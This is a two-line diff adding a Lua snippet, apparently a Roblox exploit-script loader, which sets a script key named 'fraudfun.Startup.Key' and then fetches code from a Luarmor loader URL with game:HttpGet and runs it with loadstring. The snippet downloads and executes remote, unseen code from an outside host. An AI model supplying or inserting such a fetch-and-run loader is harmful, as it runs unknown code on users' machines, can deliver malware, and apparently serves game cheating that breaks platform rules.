@@ -1,0 +1,2 @@
+script_key = fraudfun.Startup.Key
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/9d7b8d26bf85a0a4b20e2db9d3ea99ef.lua"))()
